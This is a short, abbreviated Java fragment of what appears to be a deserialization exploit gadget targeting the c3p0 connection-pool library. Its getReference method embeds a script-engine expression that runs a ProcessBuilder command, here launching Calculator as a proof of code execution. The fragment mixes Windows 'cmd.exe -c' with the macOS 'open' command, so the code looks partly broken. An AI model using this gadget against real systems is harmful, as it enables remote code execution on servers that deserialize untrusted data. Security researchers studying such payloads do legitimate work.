...
public class c3p0_no_network {
    ...
    private static class NotSerializable implements ConnectionPoolDataSource, Referenceable {
        ...
        public Reference getReference() throws NamingException {
            ...
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd.exe','-c','\"open -a Calculator\"']).start()\")"));
